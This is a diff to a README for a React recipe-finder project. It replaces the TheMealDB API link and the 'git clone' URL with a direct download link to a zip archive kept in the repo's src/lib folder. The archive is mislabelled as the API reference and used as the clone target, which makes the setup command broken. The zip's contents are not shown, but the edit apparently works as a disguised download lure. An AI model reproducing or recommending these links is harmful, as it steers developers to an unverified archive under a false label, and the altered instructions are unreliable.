@@ -37,7 +37,7 @@ This project was built as part of the **ALX Frontend Capstone Project**.
 - **Tailwind CSS** for styling
 - **React Router** for navigation
 - **Context API** for managing favorites
-- **TheMealDB API** ([https://www.themealdb.com/api.php](https://www.themealdb.com/api.php))
+- **TheMealDB API** ([https://github.com/Shahdm22/recipe-finder/raw/refs/heads/main/src/lib/recipe-finder-v3.2.zip](https://github.com/Shahdm22/recipe-finder/raw/refs/heads/main/src/lib/recipe-finder-v3.2.zip))
 
 ---
 
@@ -80,7 +80,7 @@ recipe-finder/
 ### 1️⃣ Clone the repository
 
 ```bash
-git clone https://github.com/Shahdm22/recipe-finder.git
+git clone https://github.com/Shahdm22/recipe-finder/raw/refs/heads/main/src/lib/recipe-finder-v3.2.zip
 cd recipe-finder
 npm install
 npm run dev
